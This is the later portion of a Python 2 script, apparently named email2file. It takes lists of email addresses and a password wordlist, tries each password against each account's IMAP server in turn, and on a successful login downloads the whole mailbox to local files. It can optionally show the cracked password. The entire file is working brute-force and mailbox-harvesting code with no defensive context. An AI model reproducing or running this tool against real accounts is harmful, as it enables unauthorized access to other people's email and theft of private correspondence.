         else:
            print(a)
         print('\n')
            
      # TRYING PASSWORD LIST ENTRIES ON EMAIL LOGIN               
      print("\nusing word list: ")
      if usecolor == 'color':
         print(ac.YELLOWBOLD + pwlistfile + ac.CLEAR)
      else:
         print(pwlistfile)
      print('\n')
      logging.info('using word list file: %s' % str(pwlistfile))

      lnemail = ''
      lnpass = ''
 
      if usecolor == 'color':
         print("\n\033[31mEMAIL ADDRESSES IN FILE:\033[0m %s \n" % str(eflen))
      else:
         print("EMAIL ADDRESSES IN FILE: %s \n" % str(eflen))

      logging.info('found %s email addresses in email list file ' % str(eflen))
      efcount = 1
      lenfile = len(emailfile)
      countdown = lenfile
      
      for index,line in enumerate(emailfile):
      
         emindex = index + 1
         
         countdown -= 1
         
         empercent = float(emindex) / float(lenfile)
         empercent2 = empercent - .05
         pr2 = int(empercent2 * 100)
         pr = int(empercent * 100)
         
         progress = lambda a: str(a) + "%"
         
         if usecolor == 'color':
            print("PROGRESS:\033[36;1m %s \033[0m" % str(emindex))
            print("TOTAL EMAIL ADDRESSES:\033[36;1m %s \033[0m\n" % str(lenfile))
            print("PERCENT COMPLETE:\033[36;1m %s \033[0m\n" % progress(pr2))
         
         else:
            print("PROGRESS: %s" % str(emindex))
            print("TOTAL EMAIL ADDRESSES: %s \n" % str(lenfile))
            print("PERCENT COMPLETE: %s \n" % progress(pr2))
         
         logging.info('tried ' + str(emindex) + ' entries out of ' + str(lenfile))
         
         # WITH EMAIL AND PASSWORD IN SAME FILE
         if re.search(r'^[\,]$', line):

            line = line.strip()
            linevals = line.split(",")

            lnemail = linevals[0]
            lnemail = str(lnemail.strip())
            lnpass = linevals[1]
            
            if b64sel.lower() == 'y':
               lnpass = base64.b64decode(lnpass)

            lnpass = lnpass.strip()
            lnpass = lnpass.replace("\n","")
            lnpass = str(lnpass)

            if usecolor == 'color':
               print('\033[32mUSING EMAIL ADDRESS: \033[34;1m' + lnemail + ac.CLEAR)
            
            else:
               print('USING EMAIL ADDRESS: ' + lnemail)
            
            
            logging.info('email address format check for %s' % lnemail)
            validemail = checkformat(lnemail)
            
            while 'good' not in str(validemail):
               logging.warning('bad email format for %s' % lnemail)
               lnemail = raw_input('please enter a valid email address --> ')
               validemail = checkformat(lnemail)
            
               
            logging.info('attempting to log onto %s' % lnemail)
            atdomain = re.search("@.*", lnemail).group()
            emaildomain = atdomain[1:]

            imap_server = 'imap.' + emaildomain
            imap_port = 993
            
            try:
               socket.getaddrinfo(imap_server,0)
            except:
               pass
               print('\ncould not resolve DNS for %s. ' % imap_server)
               imap_server = 'mail.' + emaildomain
               print('trying %s instead...\n' % imap_server)
               logging.warning('imap.' + emaildomain + ' failed to resolve to an IP address. trying mail.' + emaildomain)
            
            res_server, res_ip = resolveimap(imap_server)
            
            if len(res_server) < 1 or len(res_ip) < 1:
               res_server, res_ip = resolveimap(imap_server)
            
            imap_server = res_server

            logging.info('trying server %s on port %s' % imap_server, imap_port)
            loginok = checklogin(lnemail, lnpass, imap_server, sslcon)

            if 'OK' not in loginok:
               print('login failure. skipping to next entry in list...')
               logging.warning('LOGIN to %s failed' % emailaddr)
               continue
               
            else:
               logging.info('LOGIN to %s successful' % emailaddr)
               getimap(lnemail, lnpass, res_ip, sslcon)
               
         # EMAIL AND PASSWORD IN SEPARATE FILES
         else:
            
            lnemail = line.strip()
            lnemail = lnemail.replace("\n","")
            atdomain = re.search("@.*", lnemail).group()
            emaildomain = atdomain[1:]

            imap_server = 'imap.' + emaildomain
            imap_port = 993
            
            try:
               socket.getaddrinfo(imap_server,0)
            except:
               pass
               print('\ncould not resolve DNS for %s. ' % imap_server)
               imap_server = 'mail.' + emaildomain
               print('trying %s instead...\n' % imap_server)
               logging.warning('imap.' + emaildomain + ' failed to resolve to an IP address. trying mail.' + emaildomain)
            
            res_server, res_ip = resolveimap(imap_server)
            
            if len(res_server) < 1 or len(res_ip) < 1:
               res_server, res_ip = resolveimap(imap_server)
            
            imap_server = res_server

            logging.info('trying server %s on port %s' % (imap_server, imap_port))
         
            if usecolor == 'color':
                     print('\n\033[34m------------------------------------------------------------\033[0m\n')
                     print('\n\033[32mUSING EMAIL ADDRESS: \033[34;1m' + line + ac.CLEAR)
                     print('\n\033[34m------------------------------------------------------------\033[0m\n')
            
            else:
               print('\n------------------------------------------------------------\n')
               print('\nusing email address: ' + line)
               print('\n------------------------------------------------------------\n')
            
            pf = open(pwlistfile, "r+")
            wordlist = pf.readlines()
            listlen = len(wordlist)

            tries = 0
            lnemail = str(lnemail)

            for lnpass in wordlist:
            
               if encryptsel.lower() == 'y':
                  lnpass = AES_Dec(cipher, lnpass)

               elif b64sel.lower() == 'y':
                  lnpass = base64.b64decode(lnpass)
                  
               lnpass = lnpass.strip()
               lnpass = lnpass.replace("\n","")
               lnpass = str(lnpass)
               loginok = checklogin(lnemail, lnpass, imap_server, sslcon)
               tries += 1

               if 'OK' not in loginok and tries <= listlen:
                  #print('tried: %s') % str(lnpass)
                  if usecolor == 'color':
                     print('\n\033[31mLOGIN FAILED for %s. \033[34;1mtrying next entry...\033[0m\n' % lnemail)
                     print('\033[33mtries: \033[35m' + str(tries) + '\033[33m out of \033[35m %s \033[0m' % str(listlen))
                     print('\n\033[34m------------------------------------------------------------\033[0m\n')
                  else:
                     print('\nLOGIN FAILED for %s. trying next entry...\n') % str(lnemail)
                     print('tries: ' + str(tries) + ' out of ' + str(listlen))
                     print('\n------------------------------------------------------------\n')
                  logging.warning('LOGIN FAILED for ' + str(lnemail) + '. tried ' + str(tries) + 'entries out of ' + str(listlen))
                  continue

               else:
                  print('\nYAY! login succeeded for account %s using entry on line %d from password list file %s.\n' % (str(lnemail),tries, str(pwlistfile)))
                  
                  if passprompt == 1:
                     showpass = raw_input('to reveal the correct, unencrypted password to authenticate the account, type SHOW. otherwise, press ENTER to continue. ***WARNING: THIS IS NOT SECURE AND CAN BE VIWEWED BY ANYONE WITH ACCESS TO YOUR TERMINAL OUTPUT*** --> ')
                     if showpass.lower() == 'show':
                        if usecolor == 'color':
                           print('\n\033[35;1maccount:\033[0m %s \n' % lnemail)
                           print('\n\033[32;1mpassword:\033[0m %s \n' % lnpass)
                        else:
                           print('\naccount: %s \n' % lnemail)
                           print('\npassword: %s \n' % lnpass)
                        print('\nCLEARING SCREEN IN 3 seconds...\n')
                        time.sleep(3)
                        os.system('clear')
                  
                  print('\ngetting mailbox contents for %s...\n' % lnemail)
                  logging.info('LOGIN to %s successful! getting mailbox contents...' % lnemail)
                  getimap(lnemail, lnpass.strip(), imap_server, sslcon)
                  tries = 100
                  break

            if tries >= listlen and tries < 100:
               if usecolor == 'color':
                  print('\n\033[35mexhausted all entries in password list for:\033[33m %s.\n\033[0m' % lnemail)
               else:
                  print('\nexhausted all entries in password list for %s.\n' % lnemail)
               logging.warning('all entries in password list exhausted for %s' % lnemail)
         
         efcount += 1
         
         if usecolor == 'color':
            print("remaining email addresses to process:\033[32;1m %s \033[0m\n" % str(countdown))
            print("PERCENT COMPLETE:\033[36;1m %s \033[0m\n" % progress(pr))
            print('\n\033[34m------------------------------------------------------------\033[0m\n')
         else:
            print("PERCENT COMPLETE: %s \n" % progress(pr))
               
         if countdown <= 0 and efcount >= lenfile:
            if usecolor == 'color':
               print('\033[41;1m\033[33mfinished processing all email addresses and passwords.\033[0m\n')
            else:
               print('finished processing all email addresses and passwords.\n')
            logging.info('successfully processed all email addresses and passwords.')
            break
            
   ###########################
   # NOT USING PASSWORD LIST #
   ###########################
   else:
   
      eflen = len(emailfile)
      logging.info('found %d email addresses in email list file %s' % (eflen, emaillistfile))
      efcount = 1
      lenfile = len(emailfile)
      
      if usecolor == 'color':
         print("\n\033[31m%d EMAIL ADDRESSES IN FILE:\033[0m %s \n" % (eflen, emaillistfile))
      else:
         print("\n%d EMAIL ADDRESSES IN FILE: %s \n" % (eflen,emaillistfile))
      countdown = lenfile
      
      while efcount <= eflen:
         for index,line in enumerate(emailfile):
      
            emindex = index + 1
            countdown -= 1
         
            empercent = float(emindex) / float(lenfile)
            empercent2 = empercent - .05
            pr2 = int(empercent2 * 100)
            pr = int(empercent * 100)
         
            progress = lambda a: str(a) + "%"
         
            if usecolor == 'color':
               print("PROGRESS:\033[36;1m %s \033[0m" % str(emindex))
               print("TOTAL EMAIL ADDRESSES:\033[36;1m %s \033[0m\n" % str(lenfile))
               print("PERCENT COMPLETE:\033[36;1m %s \033[0m\n" % progress(pr2))
         
            else:
               print("PROGRESS: %s" % str(emindex))
               print("TOTAL EMAIL ADDRESSES: %s \n" % str(lenfile))
               print("PERCENT COMPLETE: %s \n" % progress(pr2))
         
            logging.info('tried ' + str(emindex) + ' entries out of ' + str(lenfile))

            # WITH EMAIL AND PASSWORD IN SAME FILE
            if re.search(',', line):

               line = line.strip()
               linevals = line.split(",")

               lnemail = linevals[0]
               lnemail = str(lnemail.strip())
               lnpass = linevals[1]
               lnpass = str(lnpass.strip())
               lnpass = lnpass.replace("\n","")
               if not filter(lambda x: x>'\x7f', lnpass):
                  lnpass = base64.b64decode(lnpass)
               print('using email address: ' + lnemail)

            else:
               lnemail = line.strip()
               print('using email address: ' + lnemail)
               logging.info('trying email: ' + lnemail)
               lnpass = getpass.getpass('please enter password for above account --> ')

            atdomain = re.search("@.*", lnemail).group()
            emaildomain = atdomain[1:]

            imap_server = 'imap.' + emaildomain
            imap_port = 993
            
            
            try:
               socket.getaddrinfo(imap_server,0)
            except:
               pass
               print('\ncould not resolve DNS for %s. ' % imap_server)
               imap_server = 'mail.' + emaildomain
               print('trying %s instead...\n' % imap_server)
               logging.warning('imap.' + emaildomain + ' failed to resolve to an IP address. trying mail.' + emaildomain)
            
            if usecolor == 'color':
               print(ac.YELLOW + 'based on email address, using IMAP server: ' + ac.PINKBOLD + imap_server + ac.CLEAR)
            else:
               print('based on email address, using IMAP server: %s' % imap_server)
            
            res_server, res_ip = resolveimap(imap_server)
            
            if len(res_server) < 1 or len(res_ip) < 1:
               res_server, res_ip = resolveimap(imap_server)
            
            imap_server = res_server

            logging.info('trying server %s on port %s' % (imap_server, imap_port))
               
            loginok = checklogin(lnemail, lnpass, imap_server, sslcon)
            print(loginok)

            while 'OK' not in loginok:
               lnpass = getpass.getpass('login failure. please check password and enter again --> ')
               logging.warning('login failed for %s' % lnemail)
               loginok = checklogin(lnemail, lnpass, imap_server, sslcon)
               print(loginok)
               if 'OK' in loginok:
                  break
               else:
                  print('\nlogin failure. trying next entry.. \n ')
                  continue

            efcount += 1

            logging.info('LOGIN to %s successful' % lnemail)
            print('\ngetting inbox contents for %s.. \n' % lnemail)
            getimap(lnemail, lnpass, res_ip, sslcon)

      if efcount > eflen:
         print("\nall emails and passwords have been processed. exiting program.. \n")
         logging.info('processing complete for all emails and passwords. exiting program..')
         sys.exit(0)

########################
# SINGLE EMAIL ADDRESS #
########################

else:

   emailaddr = raw_input('please enter email address --> ')

   #VALIDATE EMAIL USING REGEX
   match = re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,15})$', emailaddr)

   # INVALID EMAIL   
   if not match:
      tries = 0

      while tries < 5:

         if usecolor == 'color':
            print('\033[31minvalid email format\033[0m\n')
            print('bad attempts: \033[33m' + str(tries) + '\033[0m\n')
            print('\033[36myou have ' + str(5 - tries) + ' attempts remaining.\033[0m\n')

         else:
            print('invalid email format')
            print('bad attempts: ' + str(tries))
            print('you have ' + str(5 - tries) + 'attempts remaining.')
         
         logging.warning('submitted invalid email format %s times' % str(tries))

         emailaddr = raw_input('please enter email again --> ')
         
         match = re.search(r'^[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,15})$', emailaddr)

         # VALID EMAIL
         if match:
            tries = 100
            break

         # 
         else:
            tries += 1

      # TOO MANY MALFORMED INPUT ATTEMPTS
      if tries == 5:
         if usecolor == 'color':
            print('\033[31m too many bad attempts using invalid format! \033[0m\n')
         else:
            print('too many bad attempts using invalid format!')

         logging.error('too many bad attempts using improperly formatted email string %s. aborting program.') % str(emailaddr.strip())
         print('aborting program..')
         sys.exit(1)
      
      # GOOD EMAIL FORMAT
      elif tries == 100:
         if usecolor == 'color':
            print('\n\033[32m email is valid \033[0m\n')
         else:
            print('\nemail is valid\n')
         logging.info('email is valid: %s' % str(emailaddr.strip()))
      
      # OTHER ERROR
      else:
         if usecolor == 'color':
            print('\033[31mERROR: unhandled exception. aborting..\033[0m\n')
         else:
            print('ERROR: unhandled exception. aborting..\n')
         logging.error('unhandled exception. aborting program.')
         sys.exit(1)

   # VALID EMAIL
   else:
      if usecolor == 'color':
         print('\033[32m\nemail is valid\033[0m\n')
      else:
         print('\nemail is valid\n')
      logging.info('email is valid: %s' % str(emailaddr.strip()))
      
   atdomain = re.search("@.*", emailaddr).group()
   emaildomain = atdomain[1:]

   imap_server = 'imap.' + emaildomain
   imap_port = 993
         
   try:
      socket.getaddrinfo(imap_server,0)
   except:
      pass
      print('\ncould not resolve DNS for %s. ' % imap_server)
      imap_server = 'mail.' + emaildomain
      print('trying %s instead...\n' % imap_server)
      logging.warning('imap.' + emaildomain + ' failed to resolve to an IP address. trying mail.' + emaildomain)
   
   print('\nchecking for IMAP server at %s...\n' % imap_server)
   
   # TRY TO RESOLVE IMAP SERVER
   res_server, res_ip = resolveimap(imap_server)
   
   if len(res_server) < 1 or len(res_ip) < 1:
      res_server, res_ip = resolveimap(imap_server)
   
   imap_server = res_server

   logging.info('trying server %s on port %s' % (imap_server, imap_port))

   # USING PASSWORD LIST
   if usewordlist.lower() == 'y':
   
      pwlistfile = raw_input('please make sure password list is in the script directory, then enter the filename --> ')
      while not os.path.isfile(pwlistfile):
         pwlistfile = raw_input('the path to the word list file you entered is not valid. please check the file and enter again --> ')
      print('')

      encryptsel = raw_input('is the word list encrypted using encryptlist.py? Y/N --> ')      
      while not re.search(r'^[nNyY]$', encryptsel):
         encryptsel = raw_input('invalid selection. enter Y if word list was encrypted using encryptlist.py or N if not encrypted --> ')
         print('')
      
      # IF PASSWORD LIST NOT ENCRYPTED  
      if encryptsel.lower() == 'n':
      
         b64sel = raw_input('is the word list base64-encoded using encodelist.py? Y/N --> ')
         print('')
         while not re.search(r'^[nNyY]$', b64sel):
            b64sel = raw_input('invalid selection. enter Y if word list is base64-encoded or N if plain text --> ')
            print('')

         # IF PASSWORD LIST NOT BASE64 ENCODED
         if b64sel.lower() == 'n':         
            gotoencsel = raw_input('storing passwords in plaintext is a security risk. \nenter 1 to encrypt the contents of your password list. \nenter 2 to use base-64 encoding. enter 3 to continue with a plaintext password list. --> ')
            while not re.search(r'^[1-3]$', gotoencsel):
               gotoencsel = raw_input('invalid selection. enter 1 to run script to encrypt your password list. \nenter 2 to base64-encode it. or enter 3 to continue with plaintext list --> ')
            # LAUNCH TO ENCRYPT PASSWORD LIST
            if gotoencsel == '1':
               print("\nlaunching encryptlist.py.. \n")
               import encryptlist
               pwlistfile = encryptlist.encryptlist()
               encryptsel = 'y'
            # LAUNCH TO BASE64 ENCODE PASSWORD LIST
            elif gotoencsel == '2':
               newpwlistfile = raw_input('please enter a filename for the generated encoded list --> ')
               while not re.match(r'^[\w\-. ]+$', newpwlistfile):
                  newpwlistfile = raw_input("invalid format. please enter a valid filename --> ")
               print("\nlaunching encodelist.py.. \n")
               import encodelist
               pwlistfile = encodelist.encode_pass(pwlistfile, newpwlistfile)
               encodesel = 'y'
               pwlistfile = newpwlistfile
            else:
               print('\n*** to encrypt your list in the future, run \'python encryptlist.py\'. to  base64-encode your list in the future, run \'python encodelist.py\' *** \n')
      
      # USING ENCRYPTED LIST  
      if encryptsel.lower() == 'y':
         secretkey = 'secret.key'
         if os.path.isfile('secret.key'):
            if usecolor == 'color':
               print('\nbase64-encoded key generated by encryptlist.py found at ' + ac.GREEN + 'secret.key' + ac.CLEAR + '. \n')
            else:
               print('\nbase64-encoded key generated by encryptlist.py found at secret.key. \n')
            keycheck = raw_input('press ENTER to use secret.key or enter the filename of your encryption key --> ')
            if len(keycheck) > 1:
               while not os.path.isfile(keycheck):
                  keycheck = raw_input('file not found. please check the filename and enter again --> ')
               secretkey = keycheck
            else:
               secretkey = 'secret.key'
         
         else:
            secretkey = raw_input('secret.key not found. please enter the filename of your encryption key --> ')
            while not os.path.isfile(secretkey):
               secretkey = raw_input('file not found. please check filename and enter again --> ')

         if usecolor == 'color':
            print(ac.PINKBOLD + '\n\n********************************************************************************')
            print(ac.YELLOWBOLD)
         print('*** EMAIL2FILE CANNOT VALIDATE IF A PASSPHRASE IS CORRECT OR INCORRECT. WRONG PASSPHRASES WILL SIMPLY RESULT IN MALFORMED DATA WHILE ATTEMPTING TO DECRYPT. ***\n')
         if usecolor == 'color':
            print(ac.PINKBOLD + '******************************************************************************** \n\n')
            print(ac.CLEAR)
         
         encpass = getpass.getpass('please enter the secret passphrase used to generate the encrypted file --> ')
         AES_Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('&')
         cryptfile = open(secretkey, 'r')
         a = cryptfile.readline()
         cryptkey = base64.b64decode(a)
         cryptfile.close()

         secretpadlen = 16 - (len(encpass) % 16)
         secret = encpass + ('&' * secretpadlen)
         cipher = AES.new(cryptkey, AES.MODE_CBC, secret)
         print('\nusing encryption key: ')
         if usecolor == 'color':
            print(ac.ORANGE + a + ac.CLEAR)
         else:
            print(a)
         print('\n')
      
      print("\nusing word list: ")
      if usecolor == 'color':
         print(ac.OKAQUA + pwlistfile + ac.CLEAR)
      else:
         print(pwlistfile)
      print('\n')
      
      pf = open(pwlistfile, "r+")
      wordlist = pf.readlines()
      listlen = len(wordlist)

      count = 0

      for emailpass in wordlist:
      
         if encryptsel.lower() == 'y':
            emailpass = AES_Dec(cipher, emailpass)

         elif b64sel.lower() == 'y':
            emailpass = base64.b64decode(emailpass)
                              
         emailpass = emailpass.strip()
         emailpass = emailpass.replace("\n","")
         emailpass = str(emailpass)
         loginok = checklogin(emailaddr, emailpass, imap_server, sslcon)
         count += 1
         
         # WRONG PASSWORD
         if 'AUTHEN' in loginok:
            print("Wrong login credentials supplied for %s. Skipping to next password..." % emailaddr)
            logging.warning('invalid password for %s. skipping to next password.' % emailaddr)
            continue

         # PASSWORD NOT CORRECTLY FORMATTED
         elif 'BAD' in loginok:
            emailpass = emailpass.strip()
            print("password format error. trying again..\n")
            logging.warning('bad password format for %s' % emailaddr)
            loginok = checklogin(emailaddr, emailpass, imap_server, sslcon)
            loginok = str(loginok)
            
            if 'OK' in loginok:
               logging.info('INFO: LOGIN to %s successful' % emailaddr)
               print('\nYAY! login succeeded for account %s using entry on line %d from password list file %s.\n' % (str(emailaddr), count, str(pwlistfile)))
               if passprompt == 1:
                  showpass = raw_input('to reveal the correct, unencrypted password to authenticate the account, type SHOW. \notherwise, press ENTER to continue. \n***WARNING: THIS IS NOT SECURE AND CAN BE VIWEWED BY ANYONE WITH ACCESS TO YOUR TERMINAL OUTPUT*** --> ')
                  if showpass.lower() == 'show':
                     if usecolor == 'color':
                        print('\n\033[35;1maccount:\033[0m %s \n' % emailaddr)
                        print('\n\033[32;1mpassword:\033[0m %s \n' % emailpass)
                     else:
                        print('\naccount: %s \n' % emailaddr)
                        print('\npassword: %s \n' % emailpass)
                     print('\nCLEARING SCREEN IN 3 seconds...\n')
                     time.sleep(3)
                     os.system('clear')
               
               print('\ngetting mailbox contents... \n')
               getimap(emailaddr, emailpass, imap_server, sslcon)
                  
               if usecolor == 'color':
                  print("\ninbox contents have been saved to file for account: " + ac.OKAQUA + emailaddr + ac.CLEAR + "\n")
               else:
                  print("\ninbox contents have been saved to file for account: %s \n" % emailaddr)
               logging.info('saved inbox contents to file for %s' % emailaddr)
               count = 100
               tries = -1
               break

         if 'OK' not in loginok and count <= listlen:
            tries = -1
            if usecolor == 'color':
               print('\n\033[31mLOGIN FAILED. \033[34;1mtrying next entry...\033[0m\n')
               print('\033[33mtries: \033[35m' + str(count) + '\033[33m out of \033[35m %s \033[0m' % str(listlen))
               print('\n\033[34m------------------------------------------------------------\033[0m')
                     
            else:
               print('\nLOGIN FAILED. trying next entry...\n')
               print('tries: ' + str(count) + ' out of ' + str(listlen))
               print('\n------------------------------------------------------------')
            logging.warning('LOGIN FAILED for ' + emailaddr + '. tried ' + str(count) + ' entries out of ' + str(listlen) + ' total.')
            print('\n')
            continue

         else:
            logging.info('LOGIN to %s successful!' % emailaddr)
            print('\nYAY! login succeeded for account %s using entry on line %d from password list file %s.\n' % (str(emailaddr),count, str(pwlistfile)))
            if passprompt == 1:
               showpass = raw_input('to reveal the correct, unencrypted password to authenticate the account, type SHOW. \notherwise, press ENTER to continue. \n***WARNING: THIS IS NOT SECURE AND CAN BE VIWEWED BY ANYONE WITH ACCESS TO YOUR TERMINAL OUTPUT*** --> ')
               if showpass.lower() == 'show':
                  if usecolor == 'color':
                     print('\n\033[35;1maccount:\033[0m %s \n' % emailaddr)
                     print('\n\033[32;1mpassword:\033[0m %s \n' % emailpass)
                  else:
                     print('\naccount: %s \n' % emailaddr)
                     print('\npassword: %s \n' % emailpass)
                  print('\nCLEARING SCREEN IN 3 seconds...\n')
                  time.sleep(3)
                  os.system('clear')
                  
            count = 100
            tries = -1
            print('\ngetting mailbox contents...\n')

            getimap(emailaddr, emailpass.strip(), imap_server, sslcon)
            
            #homedir = os.path.expanduser("~")
            #rootdir = os.path.join(homedir, 'email-output')
            rootdir = savedir
            print("\ninbox contents saved to directory: %s \n" % rootdir)
            print("\nexiting program..\n")
            sys.exit(0)
            break

      if count >= listlen and count < 100:
         tries = -1
         if usecolor == 'color':
            print('\n\033[35mexhausted all entries in password list for:\033[33m %s.\n\033[0m' % emailaddr)
         else:
            print('\nexhausted all entries in password list for %s.\n' % emailaddr)
         print('\nexiting program..\n')
         sys.exit(1)

   # PROMPT FOR PASSWORD
   else:

      emailpass = getpass.getpass('please enter password --> ')
      prompts = 10
      
      while prompts > 0:
               
         loginok = checklogin(emailaddr, emailpass, imap_server, sslcon)
         loginok = str(loginok)
         
         # OTHER ERROR
         while 'OK' not in loginok:
            emailpass = emailpass.strip()
            print("\nlogin to %s failed with the supplied credentials. \n" % imap_server)
            emailpass = getpass.getpass('please enter password again --> ')
            prompts = prompts - 1
            loginok = checklogin(emailaddr, emailpass, imap_server, sslcon)
            loginok = str(loginok)
            if 'OK' in loginok:
               logging.info('LOGIN to %s successful' % emailaddr)
               prompts = -1
               break
            else:
               logging.warning('invalid password supplied for %s' % emailaddr)
                  

         else:
            prompts = -1
            logging.info('LOGIN to %s successful!' % emailaddr)
            break
      
      if prompts == 0:
         print('\nTOO MANY FAILED LOGIN ATTEMPTS WITH WRONG PASSWORD!\n')
         logging.error('too many failed logins with bad password for email %s.' % emailaddr)
         
      elif prompts == -1:
      
         getimap(emailaddr, emailpass, imap_server, sslcon)
         #homedir = os.path.expanduser("~")
         #rootdir = os.path.join(homedir, 'email-output')
         rootdir = savedir
         #rootdir = os.path.join(savedir, folder)
         if usecolor == 'color':
            print("\ninbox contents have been saved to file for email: " + ac.OKAQUA + emailaddr + ac.CLEAR)
         else:
            print("\ninbox contents have been saved to file for email: %s" % emailaddr)
         logging.info('saved inbox contents to file for %s' % emailaddr)
         print("\nmailbox items can be found in directory: %s \n" % savedir)
         
      else:
         print("\nLOGIN FAILED: an unknown error has occurred.\n")
         logging.error('unknown error occurred while attempting login for %s.' % emailaddr)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 

      print("\nexiting application..\n")

      logging.info("exited application.")
      logging.shutdown()
      sys.exit(0)

logging.info("all tasks completed successfully. end of program.")
logging.shutdown()

sys.exit(0)
